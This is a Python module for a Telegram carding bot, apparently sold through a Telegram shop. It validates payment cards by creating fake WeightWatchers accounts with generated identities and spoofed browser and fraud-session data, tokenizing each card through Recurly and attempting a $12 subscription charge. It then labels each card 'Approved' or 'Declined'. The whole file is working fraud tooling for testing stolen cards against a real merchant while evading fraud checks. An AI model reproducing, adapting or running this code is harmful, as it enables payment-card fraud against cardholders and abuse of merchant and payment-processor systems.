# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
import requests, random, hashlib
from faker import Faker
from Commands.Gates._template import run_gate

_GATEWAY = 'Recurly CCN Charged $12'
_f = Faker('en_US')

_email    = lambda: f"{_f.user_name().strip()}@{random.choice(['gmail.com','yahoo.com','hotmail.com'])}"
_md5      = lambda t: hashlib.md5(t.encode()).hexdigest()
_password = lambda: _f.password(length=12, special_chars=False, digits=True, upper_case=True, lower_case=True)


def _flow(num, mes, ano, cvv):
    if len(ano) == 2:
        ano = f"20{ano}"
    if len(mes) == 2:
        mes = str(int(mes))   # Recurly expects single-digit month without leading zero

    email = _email()
    fst   = _f.first_name().strip()
    lst   = _f.last_name().strip()
    h     = _md5(_password())
    sess  = requests.Session()

    hdrs = {
        'ww-ssid': 'en-US-1435253412.1769447',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'ww-client': 'rsw',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'accept-language': 'es-MX,es;q=0.7',
        'origin': 'https://www.weightwatchers.com',
        'priority': 'u=1, i',
    }
    r1 = sess.post(
        'https://api.ww.com/account/v3/profile/register?market=en-US',
        headers=hdrs,
        json={'firstName': fst, 'lastName': lst, 'email': email, 'password': _password(),
              'timezone': 'America/Mexico_City', 'optin': 'email'},
        timeout=25)
    id_token = r1.json().get('id_token')
    if not id_token:
        return {'status': False, 'raise': 'No id_token from WeightWatchers register'}

    hdrs2 = {
        'sec-ch-ua-platform': '"Android"',
        'user-agent': hdrs['user-agent'],
        'content-type': 'application/x-www-form-urlencoded',
        'accept-language': 'es-MX,es;q=0.7',
        'origin': 'https://api.recurly.com',
        'referer': 'https://api.recurly.com/js/v1/field.html',
        'priority': 'u=1, i',
    }
    body = (
        f"fraud_session_id={h}&first_name={fst}&last_name={lst}"
        f"&address1=2300%20Pierce%20Street&city=Houston&state=TX&postal_code=77003&country=US&phone=8263981723"
        f"&number={num}"
        f"&fraud[0][processor]=kount&fraud[0][session_id]={h}"
        f"&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-MX"
        f"&browser[referrer_url]=https%3A%2F%2Fwww.weightwatchers.com%2Fus%2Fsignup%2Fa%2Fcheckout"
        f"&browser[screen_height]=712&browser[screen_width]=320&browser[time_zone_offset]=360"
        f"&browser[user_agent]=Mozilla%2F5.0%20%28Android%2013%3B%20Mobile%3B%20rv%3A122.0%29%20Gecko%2F122.0%20Firefox%2F122.0"
        f"&month={mes}&year={ano}"
        f"&version=4.41.1&key=ewr1-shv8o27mJEHUWR0L6GVUWE"
        f"&deviceId=YfX1MK7XyiWYOm4S&sessionId=ydh94qIN0quil9qt&instanceId=XmRsUPLIOTQBioYg"
    )
    r2 = sess.post('https://api.recurly.com/js/v1/token', headers=hdrs2, data=body, timeout=25)
    token = r2.json().get('id')
    if not token:
        return {'status': False, 'raise': f"No Recurly token: {r2.text[:120]}"}

    hdrs['authorization'] = f'Bearer {id_token}'
    r3 = sess.post(
        'https://api.ww.com/sms/v1/subscriptions/enroll?locale=en-US&source=checkout',
        headers=hdrs,
        json={'offerPlanId': '24137bb9-d595-499e-80e7-34e409c9c046',
              'billingInfo': {'tokenId': token, 'paymentMethodType': 'creditCard'}},
        timeout=25)
    body3 = r3.text

    if 'CVV' in body3:
        return {'status': True, 'success': True, 'response': 'Approved ✅ | CVV mismatch (charged $12)'}
    elif any(kw in body3.lower() for kw in ['declined', 'error', 'fail']):
        try:    msg = r3.json().get('message', body3[:120])
        except Exception: msg = body3[:120]
        return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg}'}
    else:
        return {'status': True, 'success': True, 'response': f'Approved ✅ | Subscription enrolled ({r3.status_code})'}


def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def gateCmd(bot, update, gestion):
    run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_checker)


def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}

# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
